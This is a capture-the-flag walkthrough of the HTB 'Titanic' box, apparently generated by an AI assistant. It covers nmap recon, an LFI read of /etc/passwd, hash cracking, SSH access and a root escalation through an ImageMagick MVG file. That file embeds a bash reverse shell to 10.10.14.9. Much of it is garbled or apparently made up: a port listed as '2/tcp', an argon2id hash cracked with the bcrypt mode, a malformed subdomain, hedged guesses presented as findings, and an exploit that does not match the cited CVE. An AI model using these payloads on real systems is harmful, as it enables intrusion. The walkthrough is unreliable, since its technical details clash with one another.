## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)

## ⚙️ Reconnaissance

### 🔍 Full Port Scan

```bash
nmap -p- --min-rate=10000 -oN fullscan.nmap 10.10.11.55
```

### 🎯 Service Enumeration

```bash
nmap -sC -sV -p22,80,3000 -oN targeted.nmap 10.10.11.55
```

```
2/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 📁 Web Fuzzing with FFUF

```bash
ffuf -H "Host: titanic.htb" -u http://10.10.11.55/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
```

---

## 🌐 Web Enumeration

### 🔬 Subdomain and Path Discovery

Found a subdomain like `gitea.10.10.11.55` or a Docker-exposed interface.

### 🔍 Sensitive File Detection

Discovered and accessed Docker configuration:

```bash
curl http://10.10.11.55/config.json
```

---

## 🪓 LFI Exploitation

Identified an LFI vulnerability:

```bash
curl 'http://10.10.11.55/?page=../../../../etc/passwd'
```

Explored log files, user configs, and Docker content via LFI.

---

## 🔐 Credentials and Hash Cracking

### 📦 Found Hashes in a DB Dump

After analyzing LFI-accessed files or Docker config:

```bash
cat db.sql | grep password
```

Extracted hash:

```
$argon2id$v=19$m=65536,t=2,p=1$<salt>$<hash>
```

### 🔓 Cracked Hash with Hashcat

```bash
hashcat -m 3200 -a 0 hash.txt rockyou.txt
```

---

## 👤 User Access

### 🔑 Login via SSH

```bash
ssh user@10.10.11.55
# Password: cracked_password
```

### 🏁 Captured User Flag

```bash
cat ~/user.txt
```

---

## 🧹 Enumeration for Privilege Escalation

### 🔍 Find Writable Files and Logs

```bash
find / -writable -type f 2>/dev/null
```

Discovered a suspicious script:

```
/opt/scripts/idetinty_image.sh
```

Log file analysis suggested periodic image processing.

---

## 💥 Privilege Escalation via ImageMagick (CVE-2024-41817)

### 🛠️ Create Exploit Payload (MVG)

```bash
echo 'push graphic-context
viewbox 0 0 640 480
fill "url(https://example.com"|`/bin/bash -i >& /dev/tcp/10.10.14.9/4444 0>&1`"
pop graphic-context' > shell.mvg
```

### 📤 Serve Exploit

```bash
python3 -m http.server 80
```

### 🖼️ Trigger ImageMagick

Placed `shell.mvg` where `idetinty_image.sh` picks it up.

### 🔁 Reverse Shell Listener

```bash
nc -lvnp 4444
```

---

## 👑 Root Access

### 🏁 Read Root Flag

```bash
cat /root/root.txt
```

---

## 🧷 Summary

|Step|Tool / Technique|Key Finding|
|---|---|---|
|Recon|Nmap, FFUF|Found HTTP services, subdomains|
|LFI|Curl + Parameter Fuzzing|Read `/etc/passwd`, Docker config|
|Credentials|Hashcat|Cracked user hash|
|User Shell|SSH|Gained shell via cracked creds|
|Privesc|ImageMagick (CVE-2024-41817)|RCE via crafted `.mvg` file|

---

Would you like this converted into a downloadable `.md` file or saved into your walkthrough collection?